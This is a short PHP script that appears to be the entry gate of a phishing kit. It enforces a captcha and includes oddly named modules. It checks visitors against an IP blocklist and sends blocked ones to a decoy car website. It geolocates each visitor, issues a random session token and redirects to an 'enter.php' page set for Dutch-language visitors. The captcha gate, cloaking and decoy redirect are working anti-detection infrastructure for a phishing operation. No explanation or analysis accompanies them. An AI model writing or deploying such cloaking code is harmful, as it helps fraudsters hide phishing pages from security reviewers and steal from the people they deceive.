<?php
	error_reporting(0);
    session_start();
if (!isset($_SESSION['passed_captcha']) || $_SESSION['passed_captcha'] !== true) {
    header("Location: captcha.php");
    exit;

}
	include('./CryoFusion/Emberclaw.php');
	include('./CryoFusion/CherryBlossom.php');
	include('./CryoFusion/EmeraldCity.php');
	include('./CryoFusion/GoldenGateBridge.php');
	include('./CryoFusion/GrandCanyon.php');
	include('./CryoFusion/PacificOcean.php');
	include('./CryoFusion/SerengetiPlains.php');
	include('./CryoFusion/VictoriaFalls.php');
	include('./CryoFusion/Thalorinox.php');
	
	include "./CryoFusion/geoplugin.class.php";
	include "./CryoFusion/UserInfo.php";
	include "./shadowVice/functions.php";

	
	function isBlocked($ip) {
        $blockedIPs = file_get_contents('./BMCC/blocked_ips.txt');
        return strpos($blockedIPs, $ip) !== false;
    }
	
	$userIP = get_client_ip();

    if (isBlocked($userIP)) {
        header("Location: https://www.superhonda.com/");
        exit();
    }
    
    

	$geoplugin = new geoPlugin();
	$geoplugin->locate();
	$ip = get_client_ip();
    $present_time = date("H:i:s"."-"."m/d/y");

    if ($_SERVER['HTTP_HOST'] === "localhost") {
        $_SERVER['HTTP_HOST'] = "127.0.0.1";
    }
	
	function generateToken($length = 16) {
    $characters = 'abcdefghijklmnopqrstuvwxyz1234567890';
    $blanco_token = '';
    for ($i = 0; $i < $length; $i++) {
        $blanco_token .= $characters[random_int(0, strlen($characters) - 1)];
    }
    return $blanco_token;
}
	$_SESSION['blanco_token'] = generateToken();
	
	
    echo 
    "<script>
        window.location = './enter.php?lang=nl&id={$_SESSION['blanco_token']}&Channel=&return_to=';
    </script>";
	exit;
	
?>